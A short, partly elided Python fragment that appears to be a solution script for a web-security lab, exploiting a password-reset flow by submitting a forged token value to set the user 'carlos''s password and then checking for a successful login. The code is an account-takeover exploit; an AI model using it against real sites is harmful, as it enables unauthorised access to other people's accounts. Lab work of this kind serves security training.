...
def access_carlos_account(s, url):
    ...
    print("Resetting Carlo's password...")
    password_reset_url = url + "/forgot-password?temp-forgot-password-token=x"
    password_reset_data = {"temp-forgot-password-token": "x", "username": "carlos", "new-password-1": "test", "new-password-2": "test"}
    ...
    if "Log out" in r.text:
        print("[+] We have successfully logged into Carlos's acccount!")
    else:
